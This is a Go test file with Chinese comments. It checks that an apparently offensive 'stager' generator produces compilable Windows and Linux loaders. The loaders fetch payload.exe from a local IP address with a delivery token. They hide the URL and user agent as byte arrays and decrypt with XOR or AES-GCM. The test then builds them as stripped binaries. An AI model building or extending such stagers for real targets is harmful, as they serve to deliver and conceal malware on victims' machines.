package stager

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestGenerateSourceCodeCompiles 验证 Windows/Linux 模板生成源码可编译
// （覆盖 URL/UA 字节数组拼接 + XorKey 解密函数注入的模板正确性）
func TestGenerateSourceCodeCompiles(t *testing.T) {
	// 检查 go 工具链
	if _, err := exec.LookPath("go"); err != nil {
		t.Skip("go 工具链不可用，跳过")
	}

	cases := []struct {
		name string
		os   string
		aead bool
	}{
		{"windows", "windows", false},
		{"linux", "linux", false},
		{"windows-aead", "windows", true},
		{"linux-aead", "linux", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cfg := &StagerConfig{
				DownloadURL: "http://192.168.0.102:8089/d/ab12cd/full/payload.exe",
				UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				Timeout:     30,
				Arch:        "x64",
				OS:          c.os,
				SleepTime:   3,
				MaxRetries:  3,
				Password:    "secret",
				XorKey:      0x5A,
				AccessToken: "deliver-token-123",
			}
			if c.aead {
				cfg.XorKey = 0
				cfg.CryptoMode = "aead"
				cfg.DeliveryKey = []byte("0123456789abcdef0123456789abcdef")
			}
			sb := NewStagerBuilder(cfg)
			if err := sb.GenerateSourceCode(); err != nil {
				t.Fatalf("GenerateSourceCode: %v", err)
			}
			src := sb.GetSourceCode()
			if len(src) == 0 {
				t.Fatal("生成的源码为空")
			}
			if !strings.Contains(src, "X-Delivery-Token") || !strings.Contains(src, "deliver-token-123") {
				t.Fatal("配置 AccessToken 后源码应通过 X-Delivery-Token 头携带令牌")
			}
			if c.aead {
				if !strings.Contains(src, "crypto/aes") || !strings.Contains(src, "crypto/cipher") {
					t.Fatal("AEAD 模式下源码应导入 crypto/aes 与 crypto/cipher")
				}
				if strings.Contains(src, "^=") {
					t.Fatal("AEAD 模式不应再生成 XOR 解密")
				}
			} else if strings.Contains(src, "crypto/aes") {
				t.Fatal("非 AEAD 模式不应导入 crypto/aes")
			}

			// 编译验证
			dir := t.TempDir()
			f := filepath.Join(dir, "main.go")
			if err := os.WriteFile(f, []byte(src), 0644); err != nil {
				t.Fatal(err)
			}
			env := append(os.Environ(), "GOOS="+c.os, "GOARCH=amd64", "CGO_ENABLED=0")
			out := filepath.Join(dir, "stager")
			if c.os == "windows" {
				out += ".exe"
			}
			cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", out, f)
			cmd.Env = env
			if b, err := cmd.CombinedOutput(); err != nil {
				t.Fatalf("编译失败: %v\n%s", err, b)
			}
		})
	}
}

// TestStrBytesLiteral 验证字节数组字面量生成
func TestStrBytesLiteral(t *testing.T) {
	got := strBytesLiteral("abc")
	want := "97,98,99"
	if got != want {
		t.Fatalf("strBytesLiteral(abc) = %q, want %q", got, want)
	}
	if strBytesLiteral("") != "0" {
		t.Fatal("空字符串应生成 0")
	}
}
